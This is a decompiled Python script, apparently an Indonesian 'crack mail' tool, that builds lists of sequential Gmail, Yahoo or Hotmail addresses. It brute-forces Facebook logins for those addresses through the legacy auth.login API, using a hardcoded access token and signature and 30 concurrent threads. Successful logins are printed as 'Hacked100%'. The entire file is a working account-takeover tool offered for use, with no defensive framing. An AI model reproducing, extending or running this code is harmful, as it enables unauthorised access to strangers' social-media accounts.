# Decompiled By RandiSr
# Github : https://github.com/RANDIOLOY
# Coded by YayanXD (fb.me/KM39453) --
import os, re, requests, concurrent.futures
from random import randint

def brute(user, passs):
  try:
    for pw in passs:
      params={
        'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
        'format': 'JSON',
        'sdk_version': '2',
        'email': user,
        'locale': 'en_US',
        'password': pw,
        'sdk': 'ios',
        'generate_session_cookies': '1',
        'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
      }
      api='https://b-api.facebook.com/method/auth.login'
      response=requests.get(api, params=params)
      if re.search('(EAAA)\w+', str(response.text)):
        print('  [Hacked100%] %s 😎 %s '%(str(user), str(pw)))
        break
      elif 'www.facebook.com' in response.json()['error_msg']:
        print('  [Chekpoint] %s 😌 %s '%(str(user), str(pw)))
        break
  except: pass

def email():
  data = []
  os.system('cls' if os.name == 'nt' else 'clear')
  print('''
\33[33;1m   ___          _                   _ _ 
\33[34;1m  / __\ __ __ _| | __   /\/\   __ _(_) |
\33[33;1m / / | '__/ _` | |/ /  /    \ / _` | | |
\33[34;1m/ /__| | | (_| |   <  / /\/\ \ (_| | | |\33[35;1mFacebook
\33[33;1m\____/_|  \__,_|_|\_\ \/    \/\__,_|_|_|
\33[34;1m────────────────────────────────────────────────
\33[34;1m{\33[35;1m•\33[34;1m} \33[33;1mAuthor    \33[31;1m: \33[34;1mYayanXD
\33[34;1m{\33[35;1m•\33[34;1m} \33[33;1mGithub    \33[31;1m: \33[34;1mgithub.com/Yayan-XD
\33[34;1m{\33[35;1m•\33[34;1m} \33[33;1mInstagram \33[31;1m: \33[34;1myayanxd_
\33[34;1m────────────────────────────────────────────────
   \33[35;1mContoh Username \33[0;33mYayanxd
  ''')
  nama=input(' \33[36;1m  Masukan Username \33[31;1m: \33[33;1m ')
  domain=input('''
\33[34;1m────────────────────────────────────────────────
   \33[1;35mDomain \33[31;1mGmail,\33[0;37mYahoo,\33[34;1mHotmail
   \33[36;1mPilih Domain \33[31;1m>>> \33[35;1m{\33[34;1mg,\33[33;1my,\33[31;1mh\33[35;1m} \33[31;1m: \33[33;1m''').lower().strip()
  list={
    'g':'@gmail.com',
    'y':'@yahoo.com',
    'h':'@hotmail.com'
  }
  exit('  \33[31;1m Domain Tidak ada') if not domain in ['g','y','h'] else ''
  jml=int(input('''
\33[34;1m────────────────────────────────────────────────
  \33[0;35mTotal Email Max \33[31;1m: \33[33;1m1000
  \33[0;36mTotal \33[36;1m: \33[35;1m '''))
  setpw=input('''
\33[34;1m────────────────────────────────────────────────
\33[0;35mContoh Password \33[31;1m: \33[32;1mYayan123
  \33[0;36mMasukan password \33[36;1m:\33[33;1m ''').split(',')
  [data.append({'user': nama+str(e)+list[domain], 'pw':[(i) for i in setpw]}) for e in range(1,jml+5)]
  print('''
\33[34;1m────────────────────────────────────────────────
\33[1;35mBerhenti Tekan CTRL+z
\33[1;33mMohon Tunggu...
\33[34;1m────────────────────────────────────────────────
\33[36;1m
  ''')
  with concurrent.futures.ThreadPoolExecutor(max_workers=30) as th:
    {th.submit(brute, user['user'], user['pw']): user for user in data}
  print('\n  Selesai')

email() if __name__ == '__main__' else exit('\33[31;1mEmail Tidak ada!')

